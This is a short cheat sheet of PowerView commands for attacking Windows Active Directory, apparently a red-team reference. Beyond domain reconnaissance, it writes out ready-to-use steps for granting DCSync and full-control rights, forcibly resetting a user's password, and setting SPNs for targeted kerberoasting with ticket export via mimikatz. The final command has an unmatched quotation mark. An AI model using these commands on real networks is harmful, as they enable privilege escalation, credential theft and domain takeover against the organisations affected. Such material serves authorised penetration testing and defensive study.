### Source 
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1  

### Get domain controller for current domain
```
Get-NetDomainController
```

### Get remote logged in user
```
Get-NetSession -ComputerName <fqdnRhost>
```

### Get object descriptions
```
Get-NetUser | select-object samaccountname,description | fl | Out-File <file>.txt
```

### Get specific user description
```
Get-NetUser -Username <user> 
```

### Get list of all domain trusts
```
Get-NetDomainTrust
```

### Get details about the current forest
```
Get-NetForest
```

### Find all machines where user has local admin rights
```
Find-LocalAdminAccess –Verbose -Domain <domain> -Computername <rhost>
```

### Show all security identifiers (SID) that can create new GPOs
```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<domainComponent>,DC=<domainComponent>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

### Get name of SID
```
ConvertFrom-SID <securityIdentifier>
```

### Show all principals that can write to GP-Link attributes
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

### Get computeraccounts in specific OU
```
Get-DomainComputer | ? { $_.DistinguishedName -match "<distinguishedName>" -or $_.DistinguishedName -match "OU=<ou>" } | select DnsHostName
```

### Add full permissions over a group to specific user (right = All or ResetPassword or WriteMembers)
```
Add-ObjectAcl -TargetADSprefix '<distinguishedName>' -PrincipalSamAccountName <user> -Rights <right> -Verbose
```

### Add DCSync right to a specific user
```
Add-ObjectAcl -TargetDistinguishedName 'distinguishedName' -PrincipalSamAccountName <user> -Rights DCSync -Verbose
```

### Set a new password for specific user
```
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Verbose
```

### Check if user has SPN set (targeted kerberoast)
```
Get-DomainUser -Identity <user> | select serviceprincipalname
Get-DomainComputer -Identity <user> | select serviceprincipalname
```

### Set a new SPN
```
Set-DomainObject -Identity <userOrComputer> -Set @{serviceprincipalname='foo/bar'}
```

### Request ticket from SPN
```
Request-SPNTicket -SPN 'foo/bar'
```

### After export of tickets using mimikatz remove SPN
```
Set-DomainObject -Credential $Cred -Identity <userOrComputer> -Clear serviceprincipalname
```

### List accessible shares (without -ComputerName check all domain joined hosts)
```
Find-DomainShare -CheckShareAccess -ComputerName <rhost>
```

### Search for accounts with DS-Replication-Get-Changes or DS-Replication-Get-Changes-In-Filtered-Set
```
Get-ObjectAcl -DistinguishedName "dc=<domainComponent>,dc=<domainComponent> -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

